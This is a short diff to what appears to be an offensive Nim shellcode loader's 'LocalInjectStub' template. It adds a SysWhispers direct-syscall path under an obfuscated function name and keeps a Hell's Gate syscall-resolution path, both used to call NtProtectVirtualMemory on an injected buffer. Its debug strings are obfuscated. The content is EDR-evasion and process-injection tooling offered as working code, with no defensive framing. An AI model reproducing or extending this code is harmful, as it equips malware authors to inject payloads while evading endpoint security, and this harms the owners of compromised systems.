@@ -160,16 +160,20 @@ let LocalInjectStub*  = """
                             else:
                                 echo obf("[-] Failed to read the original RX section")
                                 quit(1)
-
-                    when defined(Hellsgate):
-                        if getSyscall(ntProtectTable):
-                            syscall = ntProtectTable.wSysCall
-                        else:
-                            when defined(verbose):
-                                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                     var protectAddress: LPVOID = buffer
                     var oProtect: DWORD
-                    status = NtProtectVirtualMemory(-1, addr protectAddress, addr allocationSize, PAGE_READWRITE, addr oProtect)
+                    
+                    when defined(SysWhispers):
+                        status = uashdiasdj(-1, &protectAddress, &allocationSize, PAGE_READWRITE, addr oProtect)
+                    else:
+                        when defined(Hellsgate):
+                            if getSyscall(ntProtectTable):
+                                syscall = ntProtectTable.wSysCall
+                            else:
+                                when defined(verbose):
+                                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                        
+                        status = NtProtectVirtualMemory(-1, addr protectAddress, addr allocationSize, PAGE_READWRITE, addr oProtect)
                     when defined(verbose):
                         if (status == 0):
                             echo obf("[+] NtProtectVirtualMemory success! "), repr(protectAddress)
